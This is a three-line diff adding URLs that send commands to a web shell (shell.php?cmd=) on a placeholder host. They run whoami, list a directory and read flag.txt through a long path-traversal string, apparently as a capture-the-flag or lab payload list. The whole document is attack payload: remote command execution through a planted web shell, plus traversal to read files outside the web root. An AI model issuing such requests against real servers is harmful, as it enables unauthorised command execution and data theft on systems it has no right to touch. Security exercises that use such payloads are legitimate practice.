@@ -1,0 +1,3 @@
+https://target.tld/path/shell.php?cmd=whoami
+https://target.tld/path/shell.php?cmd=ls+-la
+https://target.tld/path/shell.php?cmd=cat+../../../../../../../../../../flag.txt
